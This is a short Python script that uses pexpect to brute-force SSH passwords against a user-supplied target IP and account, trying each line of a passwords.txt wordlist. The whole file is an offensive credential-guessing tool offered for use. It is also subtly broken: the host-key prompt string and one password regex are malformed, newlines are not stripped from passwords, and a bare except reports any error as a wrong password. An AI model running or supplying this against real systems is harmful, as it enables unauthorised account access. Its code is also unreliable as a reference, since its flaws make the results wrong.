#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pexpect

PROMPT = ['# ','>>> ','> ','\$ ']

def connect(user, host, password):
  ssh_newkey = 'Are  you sure you want to continue connecting'
  connStr = 'ssh ' + user + '@' + host
  child = pexpect.spawn(connStr)
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])

  if ret == 0:
    print('[-] Error Connecting')
    return
  if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT, '[P|password: '])
    if ret == 0:
      print('[-] Error Connecting')
      return
  child.sendline(password)
  child.expect(PROMPT)
  return child


def main():
  host = input("Enter IP Address of Target to Bruteforce: ")
  user = input("Enter User Account You Want to Bruteforce: ")
  file = open('passwords.txt','r')
  for password in file.readlines():
    try:
      child = connect(user,host,password)
      print('[+] Password Found: {} '.format(password).strip())
    except:
      print('[-] Wrong Password: {} '.format(password).strip())

main()